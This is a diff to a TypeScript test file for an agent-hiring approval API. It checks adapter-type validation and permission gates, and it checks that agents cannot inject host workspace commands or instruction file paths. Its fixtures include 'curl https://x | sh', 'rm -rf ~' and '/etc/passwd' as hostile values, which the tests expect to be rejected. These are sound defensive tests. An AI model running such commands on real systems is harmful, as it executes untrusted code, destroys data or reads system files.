@@ -31,6 +31,11 @@ const AGENT_SELF = "abcdef11-1111-4111-8111-111111111111";
 const AGENT_OTHER = "22222222-2222-4222-8222-222222222222";
 
 function registerModuleMocks() {
+  vi.doMock("../adapters/registry.js", () => {
+    const findServerAdapter = (type: string) =>
+      ["claude_local", "codex_local", "process"].includes(type) ? { type } : null;
+    return { findServerAdapter, findActiveServerAdapter: findServerAdapter };
+  });
   vi.doMock("../services/index.js", () => ({
     accessService: () => mockAccessService,
     approvalService: () => mockApprovalService,
@@ -116,6 +121,7 @@ describe("approval routes requester and hire-target scoping", () => {
   beforeEach(() => {
     vi.resetModules();
     vi.doUnmock("../services/index.js");
+    vi.doUnmock("../adapters/registry.js");
     vi.doUnmock("../routes/approvals.js");
     vi.doUnmock("../middleware/index.js");
     registerModuleMocks();
@@ -240,10 +246,179 @@ describe("approval routes requester and hire-target scoping", () => {
     expect(mockApprovalService.create).not.toHaveBeenCalled();
   });
 
-  it("accepts a hire_agent approval without an agentId", async () => {
+  it("accepts a hire_agent approval without an agentId when the adapter type is known", async () => {
+    const res = await request(await createApp(boardActor))
+      .post("/api/companies/company-1/approvals")
+      .send({ type: "hire_agent", payload: { name: "New Agent", adapterType: "claude_local" } });
+
+    expect(res.status).toBe(201);
+  });
+
+  it("requires an explicit adapter type instead of defaulting new hires to process", async () => {
     const res = await request(await createApp(boardActor))
       .post("/api/companies/company-1/approvals")
       .send({ type: "hire_agent", payload: { name: "New Agent" } });
+
+    expect(res.status).toBe(422);
+    expect(mockApprovalService.create).not.toHaveBeenCalled();
+  });
+
+  it("rejects hire_agent approvals for unknown adapter types", async () => {
+    const res = await request(await createApp(boardActor))
+      .post("/api/companies/company-1/approvals")
+      .send({ type: "hire_agent", payload: { name: "New Agent", adapterType: "definitely_not_an_adapter" } });
+
+    expect(res.status).toBe(422);
+    expect(mockApprovalService.create).not.toHaveBeenCalled();
+  });
+
+  it("requires agents:create for hire_agent approvals", async () => {
+    mockAccessService.decide.mockImplementation(async ({ action }: { action: string }) => ({
+      allowed: action !== "agents:create",
+      action,
+      reason: "deny_test",
+      explanation: "Not allowed to create agents.",
+    }));
+
+    const res = await request(await createApp(agentActor))
+      .post("/api/companies/company-1/approvals")
+      .send({ type: "hire_agent", payload: { name: "New Agent", adapterType: "claude_local" } });
+
+    expect(res.status).toBe(403);
+    expect(mockApprovalService.create).not.toHaveBeenCalled();
+  });
+
+  it("blocks agents from setting host workspace commands in a hire approval", async () => {
+    const res = await request(await createApp(agentActor))
+      .post("/api/companies/company-1/approvals")
+      .send({
+        type: "hire_agent",
+        payload: {
+          name: "New Agent",
+          adapterType: "claude_local",
+          adapterConfig: { workspaceStrategy: { type: "git_worktree", provisionCommand: "curl https://x | sh" } },
+        },
+      });
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain("payload.adapterConfig.workspaceStrategy.provisionCommand");
+    expect(mockApprovalService.create).not.toHaveBeenCalled();
+  });
+
+  it("blocks agents from setting instructions paths in a hire approval", async () => {
+    const res = await request(await createApp(agentActor))
+      .post("/api/companies/company-1/approvals")
+      .send({
+        type: "hire_agent",
+        payload: { name: "New Agent", adapterType: "claude_local", adapterConfig: { instructionsFilePath: "/etc/passwd" } },
+      });
+
+    expect(res.status).toBe(403);
+    expect(mockApprovalService.create).not.toHaveBeenCalled();
+  });
+
+  it("lets agents request a hire with an ordinary adapter config", async () => {
+    const res = await request(await createApp(agentActor))
+      .post("/api/companies/company-1/approvals")
+      .send({
+        type: "hire_agent",
+        payload: { name: "New Agent", adapterType: "claude_local", adapterConfig: { model: "claude-sonnet" } },
+      });
+
+    expect(res.status).toBe(201);
+  });
+
+  it("checks agents:create before looking at payload.agentId", async () => {
+    mockAccessService.decide.mockImplementation(async ({ action }: { action: string }) => ({
+      allowed: action !== "agents:create",
+      action,
+      reason: "deny_test",
+      explanation: "Not allowed to create agents.",
+    }));
+
+    const res = await request(await createApp(agentActor))
+      .post("/api/companies/company-1/approvals")
+      .send({ type: "hire_agent", payload: { agentId: AGENT_OTHER } });
+
+    expect(res.status).toBe(403);
+    expect(mockApprovalService.create).not.toHaveBeenCalled();
+  });
+
+  it("stores the trimmed adapter type, not the raw one", async () => {
+    const res = await request(await createApp(boardActor))
+      .post("/api/companies/company-1/approvals")
+      .send({ type: "hire_agent", payload: { name: "New Agent", adapterType: " claude_local " } });
+
+    expect(res.status).toBe(201);
+    expect(mockApprovalService.create).toHaveBeenCalledWith(
+      "company-1",
+      expect.objectContaining({ payload: expect.objectContaining({ adapterType: "claude_local" }) }),
+    );
+  });
+
+  it("blocks agents from setting host workspace commands in a runtimeConfig model profile", async () => {
+    const res = await request(await createApp(agentActor))
+      .post("/api/companies/company-1/approvals")
+      .send({
+        type: "hire_agent",
+        payload: {
+          name: "New Agent",
+          adapterType: "claude_local",
+          runtimeConfig: {
+            modelProfiles: {
+              cheap: { adapterConfig: { workspaceStrategy: { type: "git_worktree", provisionCommand: "curl https://x | sh" } } },
+            },
+          },
+        },
+      });
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain(
+      "payload.runtimeConfig.modelProfiles.cheap.adapterConfig.workspaceStrategy.provisionCommand",
+    );
+    expect(mockApprovalService.create).not.toHaveBeenCalled();
+  });
+
+  it("blocks agents from setting instructions paths in a runtimeConfig model profile", async () => {
+    const res = await request(await createApp(agentActor))
+      .post("/api/companies/company-1/approvals")
+      .send({
+        type: "hire_agent",
+        payload: {
+          name: "New Agent",
+          adapterType: "claude_local",
+          runtimeConfig: { modelProfiles: { cheap: { adapterConfig: { instructionsFilePath: "/etc/passwd" } } } },
+        },
+      });
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain("payload.runtimeConfig.modelProfiles.cheap.adapterConfig.instructionsFilePath");
+    expect(mockApprovalService.create).not.toHaveBeenCalled();
+  });
+
+  it("rejects legacy prompt templates for adapters with managed instructions", async () => {
+    for (const key of ["promptTemplate", "bootstrapPromptTemplate"]) {
+      mockApprovalService.create.mockClear();
+      const res = await request(await createApp(boardActor))
+        .post("/api/companies/company-1/approvals")
+        .send({
+          type: "hire_agent",
+          payload: { name: "New Agent", adapterType: "claude_local", adapterConfig: { [key]: "You are..." } },
+        });
+
+      expect(res.status).toBe(422);
+      expect(res.body.error).toContain("instructionsBundle/AGENTS.md");
+      expect(mockApprovalService.create).not.toHaveBeenCalled();
+    }
+  });
+
+  it("still accepts a prompt template for adapters without managed instructions", async () => {
+    const res = await request(await createApp(boardActor))
+      .post("/api/companies/company-1/approvals")
+      .send({
+        type: "hire_agent",
+        payload: { name: "New Agent", adapterType: "process", adapterConfig: { promptTemplate: "You are..." } },
+      });
 
     expect(res.status).toBe(201);
   });
@@ -253,7 +428,7 @@ describe("approval routes requester and hire-target scoping", () => {
       approvalRecord({
         type: "hire_agent",
         status: "revision_requested",
-        payload: { agentId: AGENT_OTHER, name: "Coder" },
+        payload: { agentId: AGENT_OTHER, name: "Coder", adapterType: "claude_local" },
       }),
     );
     mockApprovalService.resubmit.mockImplementation(async (_id: string, payload: Record<string, unknown>) =>
@@ -262,7 +437,7 @@ describe("approval routes requester and hire-target scoping", () => {
 
     const res = await request(await createApp(boardActor))
       .post("/api/approvals/approval-1/resubmit")
-      .send({ payload: { agentId: AGENT_OTHER, name: "Coder v2" } });
+      .send({ payload: { agentId: AGENT_OTHER, name: "Coder v2", adapterType: "claude_local" } });
 
     expect(res.status).toBe(200);
     expect(mockApprovalService.resubmit).toHaveBeenCalledWith(
@@ -286,5 +461,153 @@ describe("approval routes requester and hire-target scoping", () => {
 
     expect(res.status).toBe(422);
     expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
+  });
+
+  describe("hire resubmissions", () => {
+    function revisionRequestedHire(payload: Record<string, unknown> = {}) {
+      return approvalRecord({
+        type: "hire_agent",
+        status: "revision_requested",
+        requestedByAgentId: AGENT_SELF,
+        requestedByUserId: null,
+        payload: { agentId: AGENT_OTHER, name: "Coder", adapterType: "claude_local", ...payload },
+      });
+    }
+
+    beforeEach(() => {
+      mockApprovalService.getById.mockResolvedValue(revisionRequestedHire());
+      mockApprovalService.resubmit.mockImplementation(async (_id: string, payload: Record<string, unknown>) =>
+        approvalRecord({ type: "hire_agent", status: "pending", payload }),
+      );
+    });
+
+    async function resubmitAsRequester(payload: Record<string, unknown>) {
+      return request(await createApp(agentActor))
+        .post("/api/approvals/approval-1/resubmit")
+        .send({ payload: { agentId: AGENT_OTHER, name: "Coder", ...payload } });
+    }
+
+    it("lets the requesting agent resubmit an ordinary revised hire", async () => {
+      const res = await resubmitAsRequester({ adapterType: "claude_local", adapterConfig: { timeoutSec: 600 } });
+
+      expect(res.status).toBe(200);
+      expect(mockApprovalService.resubmit).toHaveBeenCalledTimes(1);
+    });
+
+    it("requires agents:create", async () => {
+      mockAccessService.decide.mockImplementation(async ({ action }: { action: string }) => ({
+        allowed: action !== "agents:create",
+        action,
+        reason: "deny_test",
+        explanation: "Not allowed to create agents.",
+      }));
+
+      const res = await resubmitAsRequester({ adapterType: "claude_local" });
+
+      expect(res.status).toBe(403);
+      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
+    });
+
+    it("rejects an unknown or missing adapter type", async () => {
+      for (const adapterType of ["definitely_not_an_adapter", undefined]) {
+        const res = await resubmitAsRequester({ adapterType });
+
+        expect(res.status).toBe(422);
+      }
+      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
+    });
+
+    it("stores the trimmed adapter type", async () => {
+      const res = await resubmitAsRequester({ adapterType: " claude_local " });
+
+      expect(res.status).toBe(200);
+      expect(mockApprovalService.resubmit).toHaveBeenCalledWith(
+        "approval-1",
+        expect.objectContaining({ adapterType: "claude_local" }),
+      );
+    });
+
+    it("blocks agents from setting instructions paths", async () => {
+      const res = await resubmitAsRequester({
+        adapterType: "claude_local",
+        adapterConfig: { instructionsFilePath: "/etc/passwd" },
+      });
+
+      expect(res.status).toBe(403);
+      expect(res.body.error).toContain("payload.adapterConfig.instructionsFilePath");
+      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
+    });
+
+    it("blocks agents from setting host workspace commands", async () => {
+      const res = await resubmitAsRequester({
+        adapterType: "claude_local",
+        adapterConfig: { workspaceStrategy: { type: "git_worktree", provisionCommand: "curl https://x | sh" } },
+      });
+
+      expect(res.status).toBe(403);
+      expect(res.body.error).toContain("payload.adapterConfig.workspaceStrategy.provisionCommand");
+      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
+    });
+
+    it("blocks agents from setting workspace commands in a runtimeConfig model profile", async () => {
+      const res = await resubmitAsRequester({
+        adapterType: "claude_local",
+        runtimeConfig: {
+          modelProfiles: { cheap: { adapterConfig: { workspaceStrategy: { teardownCommand: "rm -rf ~" } } } },
+        },
+      });
+
+      expect(res.status).toBe(403);
+      expect(res.body.error).toContain(
+        "payload.runtimeConfig.modelProfiles.cheap.adapterConfig.workspaceStrategy.teardownCommand",
+      );
+      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
+    });
+
+    it("lets agents keep values the revised approval already carried, but not change them", async () => {
+      // agent-hires stores the server-materialized instructions bundle in the
+      // approval payload; resubmitting that payload as received must work.
+      const carried = {
+        adapterType: "claude_local",
+        adapterConfig: {
+          instructionsBundleMode: "managed",
+          instructionsFilePath: "/paperclip/agents/coder/instructions/AGENTS.md",
+          workspaceStrategy: { type: "git_worktree", provisionCommand: "pnpm install" },
+        },
+        runtimeConfig: { modelProfiles: { cheap: { adapterConfig: { workspaceStrategy: { teardownCommand: "true" } } } } },
+      };
+      mockApprovalService.getById.mockResolvedValue(revisionRequestedHire(carried));
+
+      const unchanged = await resubmitAsRequester({ ...carried, name: "Coder v2" });
+      expect(unchanged.status).toBe(200);
+      expect(mockApprovalService.resubmit).toHaveBeenCalledTimes(1);
+
+      const changedPath = await resubmitAsRequester({
+        ...carried,
+        adapterConfig: { ...carried.adapterConfig, instructionsFilePath: "/etc/passwd" },
+      });
+      expect(changedPath.status).toBe(403);
+      expect(changedPath.body.error).toContain("payload.adapterConfig.instructionsFilePath");
+
+      const changedProfileCommand = await resubmitAsRequester({
+        ...carried,
+        runtimeConfig: { modelProfiles: { cheap: { adapterConfig: { workspaceStrategy: { teardownCommand: "rm -rf ~" } } } } },
+      });
+      expect(changedProfileCommand.status).toBe(403);
+      expect(changedProfileCommand.body.error).toContain(
+        "payload.runtimeConfig.modelProfiles.cheap.adapterConfig.workspaceStrategy.teardownCommand",
+      );
+      expect(mockApprovalService.resubmit).toHaveBeenCalledTimes(1);
+    });
+
+    it("rejects legacy prompt templates for adapters with managed instructions", async () => {
+      const res = await resubmitAsRequester({
+        adapterType: "claude_local",
+        adapterConfig: { promptTemplate: "You are..." },
+      });
+
+      expect(res.status).toBe(422);
+      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
+    });
   });
 });
